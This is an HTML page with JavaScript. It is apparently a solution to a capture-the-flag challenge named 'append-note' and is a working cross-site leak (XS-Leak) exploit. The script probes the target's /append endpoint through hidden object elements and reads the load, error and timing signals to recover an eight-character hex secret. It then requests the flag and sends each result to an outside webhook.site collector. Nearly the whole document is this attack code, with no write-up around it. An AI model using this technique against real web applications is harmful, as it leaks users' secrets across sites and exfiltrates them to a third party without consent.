<!DOCTYPE html>
<html>
<head><title>XS-Leak Object</title></head>
<body>
<div id="s">Loading...</div>
<script>
var TARGET = "https://append-note-hfskv.instancer.lac.tf";
var WEBHOOK = "https://webhook.site/70d9bf2c-e5cf-49dc-aeed-4203dbfd538d";
var CHARS = "0123456789abcdef";

navigator.sendBeacon(WEBHOOK, "OBJ_V1");

function report(d) {
    navigator.sendBeacon(WEBHOOK, d);
    new Image().src = WEBHOOK + "?m=" + encodeURIComponent(d);
}
function setStatus(s) { document.getElementById('s').textContent = s; }

// Test using object element
function testChar(prefix, c) {
    return new Promise(function(resolve) {
        var url = TARGET + "/append?content=" + encodeURIComponent(prefix + c) + "&url=" + encodeURIComponent(TARGET + "/");
        
        var obj = document.createElement('object');
        obj.data = url;
        obj.style.position = 'absolute';
        obj.style.left = '-9999px';
        
        var start = performance.now();
        var resolved = false;
        
        obj.onload = function() {
            if (!resolved) {
                resolved = true;
                var elapsed = performance.now() - start;
                try { document.body.removeChild(obj); } catch(e) {}
                resolve({ c: c, status: 'load', time: elapsed });
            }
        };
        
        obj.onerror = function() {
            if (!resolved) {
                resolved = true;
                var elapsed = performance.now() - start;
                try { document.body.removeChild(obj); } catch(e) {}
                resolve({ c: c, status: 'error', time: elapsed });
            }
        };
        
        document.body.appendChild(obj);
        
        setTimeout(function() {
            if (!resolved) {
                resolved = true;
                try { document.body.removeChild(obj); } catch(e) {}
                resolve({ c: c, status: 'timeout', time: 5000 });
            }
        }, 5000);
    });
}

function testPosition(prefix) {
    var promises = [];
    for (var i = 0; i < CHARS.length; i++) {
        promises.push(testChar(prefix, CHARS[i]));
    }
    return Promise.all(promises);
}

async function main() {
    report('START');
    setStatus('Testing with object...');
    
    try {
        var secret = "";
        
        for (var p = 0; p < 8; p++) {
            setStatus('P' + p + '...');
            var results = await testPosition(secret);
            
            var loads = results.filter(function(r) { return r.status === 'load'; });
            var errors = results.filter(function(r) { return r.status === 'error'; });
            
            report('P' + p + ':L=' + loads.length + ',E=' + errors.length);
            
            var detail = results.map(function(r) { return r.c + ':' + r.status[0] + Math.round(r.time); }).join(',');
            report('P' + p + 'D:' + detail);
            
            if (errors.length === 1) {
                secret += errors[0].c;
            } else if (loads.length === 1) {
                secret += loads[0].c;
            } else {
                // Pick by timing
                results.sort(function(a,b) { return a.time - b.time; });
                secret += results[0].c;
            }
            
            report('P' + p + '=' + secret);
        }
        
        report('SEC:' + secret);
        
        var resp = await fetch(TARGET + '/flag?secret=' + secret);
        var flag = await resp.text();
        report('FLAG:' + flag);
        setStatus(flag);
        
    } catch(e) {
        report('ERR:' + e);
    }
}

main();
</script>
</body>
</html>
